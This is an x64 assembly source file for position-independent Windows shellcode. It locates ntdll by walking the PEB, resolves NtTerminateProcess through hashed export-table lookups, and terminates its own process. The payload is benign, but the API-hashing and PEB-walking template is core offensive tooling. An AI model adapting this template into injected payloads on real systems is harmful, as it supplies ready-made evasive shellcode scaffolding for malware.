; killer.asm - x64 position-independent shellcode
; Kill current process via ntdll!NtTerminateProcess(-1, 0)
; Assemble: nasm -f bin -o killer.bin killer.asm
bits 64

%define PEB_LDR_OFF        0x18
%define LDR_MEM_ORDER_OFF  0x20
%define LDR_DLLBASE_FROM_LINK 0x20   ; DllBase(0x30) - InMemoryOrder(0x10)
%define LDR_NAMELEN_FROM_LINK 0x48   ; BaseDllName.Length(0x58) - 0x10
%define LDR_NAMEBUF_FROM_LINK 0x50   ; BaseDllName.Buffer(0x60) - 0x10
%define HASH_NTDLL         0x22d3b5ed
%define HASH_NTTERMINATE   0x1703ab2f

start:
    push    rbx
    push    rsi
    push    rdi
    push    r12
    push    r13
    push    r14
    push    r15
    sub     rsp, 0x28

    ; PEB -> PEB_LDR_DATA -> InMemoryOrderModuleList head
    mov     rax, [gs:0x60]
    mov     rax, [rax + PEB_LDR_OFF]
    lea     r12, [rax + LDR_MEM_ORDER_OFF]
    mov     rsi, [r12]

.find_mod:
    cmp     rsi, r12
    je      .fail

    mov     r13, [rsi + LDR_DLLBASE_FROM_LINK]

    mov     rdx, [rsi + LDR_NAMEBUF_FROM_LINK]
    movzx   ecx, word [rsi + LDR_NAMELEN_FROM_LINK]
    shr     ecx, 1
    xor     eax, eax
    test    ecx, ecx
    jz      .next_mod

.hash_mod:
    movzx   r8d, word [rdx]
    cmp     r8d, 0x41
    jb      .hash_acc
    cmp     r8d, 0x5A
    ja      .hash_acc
    add     r8d, 0x20
.hash_acc:
    imul    eax, eax, 33
    add     eax, r8d
    add     rdx, 2
    dec     ecx
    jnz     .hash_mod

    cmp     eax, HASH_NTDLL
    je      .got_ntdll

.next_mod:
    mov     rsi, [rsi]
    jmp     .find_mod

.got_ntdll:
    mov     rbx, r13

    cmp     word [rbx], 0x5A4D
    jne     .fail
    mov     eax, [rbx + 0x3C]
    add     rax, rbx
    cmp     dword [rax], 0x00004550
    jne     .fail

    ; PE32+ DataDirectory[0] (export) at OptionalHeader+0x70 = NT+0x88
    mov     eax, [rax + 0x88]
    test    eax, eax
    jz      .fail
    add     rax, rbx
    mov     r14, rax

    mov     ecx, [r14 + 0x18]       ; NumberOfNames
    mov     r8d, [r14 + 0x20]       ; AddressOfNames
    add     r8, rbx
    mov     r9d, [r14 + 0x24]       ; AddressOfNameOrdinals
    add     r9, rbx
    mov     r10d, [r14 + 0x1C]      ; AddressOfFunctions
    add     r10, rbx

    xor     edx, edx

.find_fn:
    cmp     edx, ecx
    jae     .fail

    mov     eax, [r8 + rdx*4]
    add     rax, rbx

    xor     r11d, r11d
    mov     rsi, rax
.hash_fn:
    movzx   r15d, byte [rsi]
    test    r15d, r15d
    jz      .hash_fn_done
    imul    r11d, r11d, 33
    add     r11d, r15d
    inc     rsi
    jmp     .hash_fn
.hash_fn_done:
    cmp     r11d, HASH_NTTERMINATE
    je      .got_fn

    inc     edx
    jmp     .find_fn

.got_fn:
    movzx   eax, word [r9 + rdx*2]
    mov     eax, [r10 + rax*4]
    add     rax, rbx

    ; NtTerminateProcess((HANDLE)-1, 0)
    mov     rcx, -1
    xor     edx, edx
    call    rax

.fail:
    xor     eax, eax
    add     rsp, 0x28
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbx
    ret
